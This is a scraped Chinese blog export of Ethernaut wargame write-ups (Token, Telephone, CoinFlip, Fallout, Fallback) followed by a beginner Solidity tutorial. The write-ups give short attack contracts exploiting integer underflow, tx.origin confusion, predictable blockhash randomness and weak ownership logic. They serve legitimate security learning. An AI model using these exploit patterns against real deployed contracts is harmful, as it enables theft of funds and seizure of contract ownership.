1.3 合约代码： // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125; &#125; 1234567891011121314151617181920212223242526## 2. 分析- 2.1 编译器版本：`^0.6.0`，且没用SafeMath库，所以可能出现整数溢出漏洞- 2.2 代码分析：- `require(balances[msg.sender] - _value &gt;= 0);`检查用户余额是否大于或等于零，但由于余额是无符号整数，当我们减去的数字 ( `_value`) 大于代`balances[msg.sender]`币的钱包余额 ( ) 时，就会发生溢出，钱包余额变为最大无符号整数减去这两个值之间的差值。 通过 require 语句后，还有一个错误是将这个溢出的值赋值给 的余额`msg.sender`：- 2.3 攻击合约：- ```solidity contract Hack &#123; function attarck() public &#123; // 实例地址 Token token = Token(0x03130C8ca692f8980461A9C96411aAf5e0A71AcB); // 自己的钱包地址 token.transfer(0x2DeF5505E8EfaD8dF16eFE1dFd8a49f52360b2e8,100); &#125; &#125; 2.4 调用Hack 合约中的 attract() 函数 3. 解题 3.1 获取关卡实例地址：0x03130C8ca692f8980461A9C96411aAf5e0A71AcB 3.2 部署攻击合约 3.3 查看我的钱包地址的余额 3.4 开始合约攻击，并查看余额 3.5 提交实例，返回结果，成功！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Telephone","slug":"Smart contracts/ethernaut/Telephone","date":"2023-01-08T04:47:10.000Z","updated":"2023-01-08T04:47:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Telephone/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Telephone/","excerpt":"","text":"1. 题目要求 要求： 获取合约的所有权 合约代码： 1234567891011121314151617// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 2. 分析 2.1 状态owner变量在constructor，唯一会更新owner的函数是 changeOwner(),它是一个只接受一个参数的公共函数address _owner。如果tx.origin值不同，msg.sender它将owner使用函数输入参数更新_owner。 2.2 tx.origin() 和 msg.sender()的区别 tx.origin(address)： 交易的发送方（完整的调用链）返回的是已发送（原始）交易的地址 msg.sender( address)：消息的发送者（当前通话）返回的是发起呼叫的值external（合约调用者） 画图区分： 2.3 攻击合约： contract Hack &#123; function exploit(Telephone level) public &#123; level.changeOwner(msg.sender); &#125; &#125; 2.4 调用Hack 合约中的 exploit（）函数，形参是关卡的实例地址就🆗的 3. 解题 3.1 获取关卡的实例：0xf956A62d9BD792a712763aA21863d3025A5dd926 3.2 调用关卡合约并部署攻击合约 3.3 查看原拥有着，并调用攻击合约中额exploit() 函数 3.4 提交实例并查看结果 3.5 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"CoinFlip","slug":"Smart contracts/ethernaut/CoinFlip","date":"2023-01-08T02:12:10.000Z","updated":"2023-01-08T02:12:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/CoinFlip/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/CoinFlip/","excerpt":"","text":"CoinFilp1. 题目要求这是一个掷硬币的游戏，你需要连续的猜对结果。 完成这一关，你需要通过你的超能力来连续猜对十次。 2. 分析2.1 tips： 参考视频 2.2 _guess = uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1 ? true : false2）我们知道不能flip()在同一个块中调用多次；否则该功能将恢复。这意味着要通过挑战，我们至少需要猜对 11 个区块 2.3 攻击合约： contract Hack &#123; CoinFlip private immutable target; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor (address _target) &#123; target = CoinFlip(_target); &#125; function flip() external &#123; bool guess = _guess(); require(target.flip(guess),&quot;guess failed&quot;); &#125; function _guess() private view returns(bool) &#123; uint256 blockValue = uint256(blockhash(block.number - 1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; return side; &#125; &#125; 2.3 调用 10次 攻击合约的 flip() 函数 来改变 CoinFilp 合约中 consecutiveWins 的值 3. 解题 3.1 获取关卡的实例：0x2F3D37ae048f36c8B2674aB1a4B8D3Bab4B6B716 3.2 在remix中调用关卡合约 3.3 部署攻击合约 3.5 调用 11次 合约中filp() 函数 3.6 提交实例并查看结果 成功！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Fallout","slug":"Smart contracts/ethernaut/Fallout","date":"2023-01-08T01:47:10.000Z","updated":"2023-01-08T01:47:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Fallout/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Fallout/","excerpt":"","text":"Fallout1.题目要求获得以下合约的所有权来完成这一关 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address payable allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(address(this).balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 2. 分析 import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; 2.1 由于没有SafeMath.sol文件在remix中，所以可以在remix中建相同路径的文件夹 2.2 阅读代码可知，在fal1out() 函数中可以修改合约的所有权，即成功调用fal1out()函数即可 3. 解题 3.1 获取关卡实例地址： 0x578d3Fca5950E9CB155B91002FAe154796D05217 3.2 调用关卡合约 3.3 3.4 查看原合约拥有者 3.5 调用Fal1out() 函数之后，再次查看合约的owner 3.6 提交实例并查看结果 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Fallback","slug":"Smart contracts/ethernaut/Fallback","date":"2023-01-07T08:47:10.000Z","updated":"2023-01-07T08:47:10.000Z","comments":true,"path":"2023/01/07/Smart contracts/ethernaut/Fallback/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/07/Smart%20contracts/ethernaut/Fallback/","excerpt":"","text":"Fallback题解1. 题目要求① 获得这个合约的所有权 ② 把它的合约余额减到0 提示： 如何通过与ABI互动发送ether 如何在ABI之外发送ether 转换 wei&#x2F;ether 单位 (参见 help() 命令) Fallback 方法 合约代码：123456789101112131415161718192021222324252627282930313233343536373839404142// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123; mapping(address =&gt; uint) public contributions; address public owner; constructor() &#123; owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; payable(owner).transfer(address(this).balance); &#125; receive() external payable &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 2. 分析 2.1 该题的题眼在于，通过owner &#x3D; msg.sender语句把合约的所有权设置为合约调用者，观察分析合约可知，在contribute()方法和 receive() 方法中拥有该语句，但如果执行contribute() 的话需要调用 0.001 * 1000000 + 1次 显然这样的作法是不可取的，故 只能采用receive()方法来实现 2.2 receive()成功调用的条件是，调用者的贡献值大于0.001ether 还用支付 &gt; 0的费用，我们只能通过调用contribute()函数改变合约调用者的贡献值，改好之后就可以调用到合约的receive()函数，就可以成为合约的拥有者 2.3 最后调用withdraw() 函数将合约的钱全部转给owner 即： 3.解题 3.1 先从题目中获取关卡的地址： 3.2 到remix中，将网络和账户切换为自己的钱包账户， 3.3 给自己的钱包账户加入贡献值 contributions 3.4 调用receive() 函数，实现获取 合约所有权操作 3.5 查看当前合约的owner 3.6 最后调用withdraw() 函数，将合约的余额全部转出 3.7 回到题目提交实例 3.8 返回结果，通过！！！：","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"solidity相关知识","slug":"Solidity/Basic_Knowledge/solidity相关知识","date":"2023-01-01T08:47:10.000Z","updated":"2023-01-01T08:47:10.000Z","comments":true,"path":"2023/01/01/Solidity/Basic_Knowledge/solidity相关知识/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/01/Solidity/Basic_Knowledge/solidity%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","excerpt":"","text":"官方文档Solidity_day01tips: 一些重要的属性 入门须知：12345// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract HelloWeb3&#123; string public _string = &quot;Hello Web3!&quot;;&#125; 代码解读： 第一行是注释，会写一下这个代码所用的软件许可（license），这里用的是MIT license。 如果不写许可，编译时会警告，但程序可以运行。solidity 的注释是由”&#x2F;&#x2F;“ 开头，后面跟注释的内容（不会被程序运行）。 1// SPDX-License-Identifier: MIT 第二行声明源文件所用的 solidity 版本，因为不同的版本语法有差别。这行代码将不允许小于 0.8.4 版本 或者 大于0.9.0版本的编译器编译（第二个条件由 ^ 提供）。Solidity 语句以分号（;）结尾。 1pragma solidity ^0.8.4; 第3-4行是合约部分，第3行创建合约（contract），并声明合约的名字 HelloWeb3。第4行是合约的内容，我们声明了一个string（字符串）变量_string，并给他赋值 “Hello Web3!”。 123contract HelloWeb3&#123; string public _string = &quot;Hello Web3!&quot;;&#125; 1. 数值类型solidity 中的变量类型 数值类型：布尔型，整数型，这类变量赋值的时候直接传递参数 引用类型： 包括数组和结构体，这类变量占用空间大，赋值的时候直接传递地址（类似于指针） 映射类型：solidity里的哈希表 函数类型：solidity文档里把函数归到数值类型，它和其他类型差别很大 1.1 布尔类型布尔类型是二值变量，取值为true 或 false 12// 布尔值bool public flag = true; 代码： 1234567891011// 布尔运算 //取非 bool public flag1 = !flag; // false //与 bool public flag2 = _bool &amp;&amp; flag1; // false //或 bool public flag3 = _bool || flag1; // true //相等 bool public flag4 = flag == flag1; // false //不相等 bool public flag5 = flag != flag1; // true tips: 值得注意的是：&amp;&amp; 和 || 运算符和Java中的 &amp;&amp; 和 || 一样的用法和使用规则,都是遵循短路规则，这意味着，假如存在f(x) || g(y) 的表达式，如果 f(x) 是true，g(y) 不会被计算，即使它和 f(x) 的结果是相反的，同理 &amp;&amp; 也是，f(x) &amp;&amp; g(y) 表达式若f(x) 为false ,则不会执行g(y)。 1.2. 整型整型是solidity 中的整数，最常用的包括 1234// 整型 int public _int = -1; // 整数，包括负数 uint public _uint = 1; // 正整数 uint256 public _number = 20220330; // 256位正整数 常用的整数运算符包括： 比较运算符（返回布尔值）: &gt;, &lt;, &#x3D;&#x3D;, &gt;&#x3D;, &lt;&#x3D;, !&#x3D; 算数运算符：+, -, *, &#x2F;, %, **(幂) 代码： 12345// 整数运算uint256 public _number1 = _number + 1; // +，-，*，/uint256 public _number2 = 2**2; // 指数uint256 public _number3 = 7 % 2; // 取余数bool public _numberbool = _number2 &gt; _number3; // 比大小 1.3. 地址类型地址类型(address) 存储一个 20 字节的值（以太坊地址的大小）。地址类型也有成员变量，并作为所有合约的基础。有普通的地址和可以转账ETH的地址 (payable)。payable的地址拥有balance和 transfer() 两个成员，方便查询ETH余额以及转账。 12345// 地址address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;address payable public _address1 = payable(_address);//payable address，可以转账、查余额// 地址类型的成员uint256 public balance = _address1.balance; // balance of address 1.4. 定长字节数组字节数组bytes 分两种，一种定长（byte, bytes8, bytes32), 另一种不定长。定长的属于数值类型，不定长的是引用类型。定长bytes 可以存一些数据，消耗gas比较少。 123// 固定长度的字节数组bytes32 public _byte32 = &quot;MiniSolidity&quot;; bytes1 public _byte = _byte32[0]; MiniSolidity 变量以字节的方式存储进变量_byte32, 转化为16进制为： 0x4d696e69536f6c69646974790000000000000000000000000000000000000000 _bytes 变量存储 _bytes32 的第一个字节，为0x4d。 1.5 枚举 enum枚举(enum) 是solidity 中用户定义的数据烈性。它主要用于 uint 分配名称，使程序易于阅读和维护。它与c 语言中的enum 类似，使用名称来代替从 0 开始的uint： 1234// 用enum将uint 0， 1， 2表示为Buy, Hold, Sellenum ActionSet &#123; Buy, Hold, Sell &#125;// 创建enum变量 actionActionSet action = ActionSet.Buy; 它可以显式的和uint相互转换，并会检查转换的正整数是否在枚举的长度内，不然会报错： 1234// enum可以和uint显式的转换function enumToUint() external view returns(uint)&#123; return uint(action);&#125; 2. 函数类型2.1 solidity中的函数 详情可参考 官方文档1function &lt;function name&gt; (&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)] tips: 方括号中的是可写可不写的关键字 funtion: s声明函数时的固定用法，想写函数，就要以function 关键字开头 ： 函数名 (): 圆括号里写函数的参数，也就是要输入到函数的变量类型和名字。 {internal|external|public|private}：函数可见性说明符，一共4种。没标明函数类型的，默认internal。 public ： 内部外部都可见。（也可用于修饰状态变量，public变量会自动生成getter函数，用于查询数值）。 private： 只能从本合约内部访问，继承的合约也不能用（也可用于修饰状态变量）。 external: 只能从合约外部访问（但是可以用this.f()来调用，f 是函数名。 - 可以直接调用内部函数，即 internal修饰的函数: - - 不能直接调用外部函数，即external修饰的函数，要用 this. 来调用： - - 否则就会报错： - - internal: 只能从合约内部访问，继承的合约可以用（也可用于修饰状态变量）。 - internal 修饰的函数可以直接被合约内的函数调用，internal 和 external 修饰的函数都可以 - 调用internal 修饰的： - - 调用external 修饰的： - - internal 可以调用 external 修饰的函数，（以我目前的水平我还是不能发现这样做有什么用处），只能通过 this.f() 【f是方法名】调用 - 否则就会报错： - - 演示代码： 12345678910111213141516171819202122232425262728293031323334353637383940// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract inter_exer &#123; address public owner; string public value; constructor() payable &#123; // 将owner 的值设置为当前合约地址 owner = address(this); &#125;// 内部函数 function inter() internal returns(string memory) &#123; value = &quot;This is inter()&quot;; return value; &#125;// 调用内部函数 function useInter() internal &#123; // this.exter(); // 通过this. 调用external 修饰的函数 inter(); &#125;// 外部函数 function exter() external returns(string memory) &#123; // useInter(); // string memory _exter = &quot;This is exter()&quot;; value = &quot;This is exter()&quot;; return value;&#125;// 调用外部函数 function useExter() external &#123; useInter(); // this.exter(); &#125;&#125; [pure | view | payable] : 决定函数权限&#x2F; 功能的关键字。payable (可支付的) ，带着它的函数，运行的时候可以给合约转入ETH 在以太坊中，如下语句被视为上链 - 写入状态变量 - 释放事件 - 创建其他合同 - 使用selfdestruct - 通过调用发送以太币 - 调用任何未标记view 和 pure 的函数 - 使用低级调用（low-level class) - 使用包含某些操作码的内联汇编 马里奥插图，合约中的转台变量（存储在链上）比作公主，三个关键字表示不同的角色 pure：中文翻译为“纯”，在solidity中理解为“纯牛子”。包含pure关键字的函数，不能读取也不能写入存储在链上的转台变量。就像小怪一样，看不到摸不着公主。 view：中文翻译为“看”，在solidity中理解为“看客”。包含view 关键字的函数，能读取但不能写入状态变量。类似马里奥，能看到公主，但终究是看客，不能入洞房。 默认值（即不带view 和 pure）：函数既可以读取也可以写入状态变量。类似马里奥中 的boss， 可以对公主为所欲为🤪🤪🤪。 pure 和 view 的区别 在合约中定义一个状态变量 number &#x3D; 5 1234// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract FunctionTypes&#123; uint256 public number = 5; 定义一个add()函数，每次调用，每次给number + 1 1234// 默认function add() external&#123; number = number + 1;&#125; 如果add()包含了pure关键字，例如 function add() pure external，就会报错。因为pure（纯纯牛马）是不配读取合约里的状态变量的，更不配改写。那pure函数能做些什么？举个例子，你可以给函数传递一个参数 _number，然后让他返回 _number+1 1234// pure: 纯纯牛马function addPure(uint256 _number) external pure returns(uint256 new_number)&#123; new_number = _number+1;&#125; view 修饰的函数，可以查看但是不能调用 1234 // view: 看客function divView (uint256 _number) external view returns(uint256 new_number)&#123; new_number = _number-1; &#125; payable 修饰的函数是可以直接给合约支付eth的 如，我用payable 修饰我的构造函数，在编译的时候便可以给合约支付eth了 [returns()]： 函数返回的变量类型和名称。 如果在returns() 的 （） 中声明了返回值的名字，且与函数体内所需返回的变量相同，则可以不需要在函数体内写return 语句, 例如： 123function divView (uint256 _number) external view returns(uint256 new_number)&#123; new_number = _number-1; &#125; 3. 函数输出3.1 返回值return 和 returnssolidity 有两个关键字与函数输出相关：return 和 returns， 他们的区别在于： returns 加在函数名后面，用于声明返回的变量类型及变量名； return 用于函数主体中，返回指定的变量。 1234// 返回多个变量function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123; return(1, true, [uint256(1),2,5]); &#125; 这段代码中，returnMultiple() 函数中将有多个输出值：returns(uint256, bool, uint256[3] memory)， 接着我们在函数主体中用 return(1, true, [uint256(1),2,5]) 确定了返回值。 其中对 uint256[3] memory 和 [uint256(1),2,5] 的理解和查阅资料： 沃日…. 这个是数组，我竟然没看出来，数组到后面再看，慢慢来嘛🍧🍧🍧 3.2 命名式返回我们可以在returns 中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。 123456// 命名式返回function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; _number = 2; _bool = false; _array = [uint256(3),2,1];&#125; 代码中，returns(uint256 _number, bool _bool, uint256[3] memory _array) 声明了返回变量类型以及变量名。这样，我们在主体中只需给变量 _number， _bool， _array 赋值就可以自动返回了。 也可以在命名格式返回中用 return 来返回变量： 1234// 命名式返回，依然支持returnfunction returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123; return(1, true, [uint256(1),2,5]);&#125; 3.3 解构式赋值solidity 使用结构式赋值的规则， 支持读取函数的全部或 部分返回值 读取所有函数返回值：声明变量，并且将要赋予的变量用 , 号隔开，按顺序排列 1234uint256 _number;bool _bool;uint256[3] memory _array;(_number, _bool, _array) = returnNamed(); 读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。下面这段代码，我们只读取 _bool ， 而不读取返回的 _number 和 _arrary ： 1(, _bool2, ) = returnNamed(); 4. 变量数据存储和作用域tips: 引用类型 ： 包括数组（arrary），结构体（struct）和 映射（mapping），这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用是必须要声明数据存储的位置。 4.1 数据位置solidity 数据存储位置有三大类：storage， memory， 和 calldata。不同存储位置的gas 成本不同。storage类型的数据存在链上，类似计算机的硬件，消耗gas多；memory 和 calldata 类型的临时存在内存里，消耗gas少。大致用法： storage：合约中的状态变量默认都是storage， 存储在链上 memory： 函数里的参数和临时变量一般用memory，存储在内存中，不上链 calldata： 和memory 类似，存储在内存中，不上链。与memoruy的不同点在于calldata 变量不能修改（immutable），一般用于函数的参数。 例子： 12345function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123; //参数为calldata数组，不能被修改 // _x[0] = 0 //这样修改会报错 return(_x);&#125; tips: calldata变量 不上链，不能修改。 4.2 数据位置和赋值规则在不同存储类型相互赋值的时候，有时会产生独立的副本（修改新变量不会影响原变量），优势会产生引用（修饰新变量会影响原变量）。规则如下： 4.2.1 storage：（合约的状态变量）赋值给本地storage （函数里的）时候，会创建引用，改变新变量会影响原变量。例子： 123456789uint[] x = [1,2,3]; // 状态变量：数组 x function fStorage() public&#123; //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x uint[] storage xStorage = x; xStorage[0] = 100;&#125;// 此时 x 数组中的值为 [100,2,3] tips: 类似于Java中的 引用类型数组，都指向同一份地址，只要一处发生改变，则引用该地址的变量的值都会发生改变 4.2.2 storage 赋值给memory， 会创建独立的副本，修改其中一个不会影响另一个；反之亦然。例子： 12345678910uint[] x = [1,2,3]; // 状态变量：数组 xfunction fMemory() public view&#123; //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x uint[] memory xMemory = x; xMemory[0] = 100; xMemory[1] = 200; uint[] memory xMemory2 = x; xMemory2[0] = 300;&#125; tips：类似于Java中的基本数据类型的数组的原理，会复制一份相同的值 4.2.3 memory 赋值给memory， 会创建引用，改变新变量会影响原变量 4.2.3 其他情况，变量赋值给 storage， 会创建独立的副本，修改其中一个不会影响另一个 4.3 变量的作用域solidity中变量按作用域划分为三种，分别是状态变量（state variable），局部变量（local variable） 和全局变量（global variable） 4.3.1 状态变量 是数据存储在链上的变量，所有合约内函数都可以访问，gas 消耗高.状态变量在合约内、函数外声明： 1234contract Variables &#123; uint public x = 1; uint public y; string public z; 在函数里更改状态变量的值： 123456function foo() external&#123; // 可以在函数里更改状态变量的值 x = 5; y = 2; z = &quot;0xAA&quot;;&#125; 4.3.2 局部变量 是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，gas低。局部变量在函数内声明： 123456function bar() external pure returns(uint)&#123; uint xx = 1; uint yy = 3; uint zz = xx + yy; return(zz);&#125; 4.3.3 全局变量 是全局范围工作的变量，都是solidity 预留关键字。他们可以在函数内不声明直接使用： 123456function global() external view returns(address, uint, bytes memory)&#123; address sender = msg.sender; uint blockNum = block.number; bytes memory data = msg.data; return(sender, blockNum, data);&#125; global() 函数中，msg.sender, block.number和msg.data，他们分别代表请求发起地址，当前区块高度，和请求数据。 blockhash(uint blockNumber): (bytes32)给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。 block.coinbase: (address payable) 当前区块矿工的地址 block.gaslimit: (uint) 当前区块的gaslimit block.number: (uint) 当前区块的number block.timestamp: (uint) 当前区块的时间戳，为unix纪元以来的秒 gasleft(): (uint256) 剩余 gas msg.data: (bytes calldata) 完整call data msg.sender: (address payable) 消息发送者 (当前 caller) msg.sig: (bytes4) calldata的前四个字节 (function identifier) msg.value: (uint) 当前交易发送的wei值 5. 引用类型，arrary, struct5.1 数组 arrary数组（Arrary）是solidity 常用的一种 变量类型，用来存储一组数据（整数， 字节， 地址等等）。数组分为固定长度数组和可变长数组两种： 固定长度数组：在声明时指定数组的长度。用 T[k] 的格式声明，其中T 是元素的类型， k 是长度，例如： 1234// 固定长度 Arrayuint[8] array1;bytes1[5] array2;address[100] array3; 可变长度数组（动态数组）：在声明时不指定数组长度。用 T[]的格式声明，其中 T 时元素的类型，例如（bytes 比较特殊，时数组，但是不用jia []）： 12345// 可变长度 Arrayuint[] array4;bytes1[] array5;address[] array6;bytes array7; 5.2 创建数组的规则在solidity 里，创建数组有一些规则： 对于 memory 修饰的 动态数组，可以用new 操作符来创建，但是必须要声明长度，并且声明后长度不能改变。例子： 123// memory动态数组uint[] memory array8 = new uint[](5);bytes memory array9 = new bytes(9); 数组字面常数（Array Literals）是写作表达方式形式的数组，用方括号包着初始化array 的一种方式，并且里面每一个元素的type 是以第一个元素为准的，例如[1,2,3] 里面所有的元素都是uint8 类型， 因为在solidity 中如果一个值没有指定type 的话，默认就是最小单位的该type， 这里int 的默认最小单位类型就是uint8。而[uint(10,2,3)] 里面的元素都是uint 类型，因为第一个元素指定了是uint 类型了，我们都以第一个元素为准。下面的合约中，对于f 函数里面的调用，如果我们没有显式对对第一个元素进行uint 强转的话，是会报错的，因为如上述我们其实是传入了uint8 类型的array，可是g 函数需要的却是uint 类型的array那就会报错。 12345678910// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;=0.4.16 &lt;0.9.0;contract C &#123; function f() public pure &#123; g([uint(1), 2, 3]); &#125; function g(uint[3] memory) public pure &#123; // ... &#125;&#125; 如果是创建的是动态数组，你需要一个一个的赋值 1234uint[] memory x = new uint[](3);x[0] = 1;x[1] = 3;x[2] = 4; 5.3 数组成员 tips：有点类似Java 栈 的数据结构 length：数组有一个包含元素数量的length成员，memory数组的长度是创建后固定的。 push() ：动态数组和bytes 拥有push() 成员，可以在数组最后添加一个0元素。 push(x)：动态数组和bytes拥有push(x) 成员，可以在数组最后添加一个x元素。 pop()：动态数组和bytes拥有pop()成员，可以移除数组最后一个元素。 5.4 结构体 struct solidity 支持通过构造结构体的形式定义新的类型。创建结构体的方法： 12345// 结构体struct Student&#123; uint256 id; uint256 score; &#125; 给结构体赋值的两种方法： 1234567891011121314// 给结构体赋值// 方法1:在函数中创建一个storage的struct引用function initStudent1() external&#123; Student storage _student = student; // assign a copy of student _student.id = 11; _student.score = 100;&#125; // 方法2:直接引用状态变量的structfunction initStudent2() external&#123; student.id = 1; student.score = 80;&#125; Solidity_day026. 映射类型 mapping6.1 映射Mapping 在映射中，人们可以通过键（Key）来查询对应的值（Value），比如：通过一个人的id来查询他的钱包地址。 声明映射的格式为mapping(_KeyType &#x3D;&gt; _ValueType)，其中 _KeyType 和 _ValueType 分别是Key 和 Value 的变量类型。 例： 12mapping(uint =&gt; address) public idToAddress; // id映射到地址mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址 6.2 映射的规则 规则1 ：映射的_KeyType 只能选择 solidity 默认的类型，比如uint ， address 等，不能用自定义的结构体。而__KeyType 可以使用自定义的类型。如下例子将报错（使用了自定义结构体）： 123456// 我们定义一个结构体 Structstruct Student&#123; uint256 id; uint256 score; &#125; mapping(Student =&gt; uint) public testVar; 规则2：映射的存储位置必须是 storage，因此可以用于合约的状态变量，函数中的 storage 变量，和library 函数的参数。不能用public 函数的参数或返回结果中，因为mapping 记录的是一种关系(key - value pair)。 规则3：如果映射声明为public ，那么solidity 会自动给你创建一个getter 函数，可以通过 Key 来查询对应的Value。 规则4：给映射新增的键值对的语法为 _Var[_Key] &#x3D; _Value，其中 _Var 是映射变量名， _Key 和 _Value 对应新增 的键值对。例： 123function writeMap (uint _Key, address _Value) public&#123; idToAddress[_Key] = _Value;&#125; 6.3 映射的原理 原理1：映射不存储任何键（Key）的资讯，也没有length的资讯。（不是很理解这个资讯是什么意思） 原理2：映射使用keccake256(key) 当成offset 获取 value 原理3：因为Ethereum 会定义所有未使用的空间为0; 所有为赋值（Value）的键（Key）初始值都是0 7. 变量初始值7.1 值类型初始值 boolean：false string：”” int: 0 uint: 0 enum：枚举中的第一个元素 address: 0x0000000000000000000000000000000000000000 或 address(0) function: internal: 空白方程 external：空白方程 可以用public 变量的 getter 函数验证上面写的初始值是否正确： 1234567891011bool public _bool; // falsestring public _string; // &quot;&quot;int public _int; // 0uint public _uint; // 0address public _address; // 0x0000000000000000000000000000000000000000enum ActionSet &#123; Buy, Hold, Sell&#125;ActionSet public _enum; // 第一个元素 0function fi() internal&#123;&#125; // internal空白方程 function fe() external&#123;&#125; // external空白方程 7.2引用类型初始值 映射mapping：所有元素都为其默认值的mapping 结构体struct：所有成员设为其默认值的结构体 数组arrary 动态数组：[] 静态数组（定长）: 所有成员设为其默认值的静态数组 可用public变量的getter 函数验证上面写的初始值是否正确： 12345678910// Reference Typesuint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0]uint[] public _dynamicArray; // `[]`mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping// 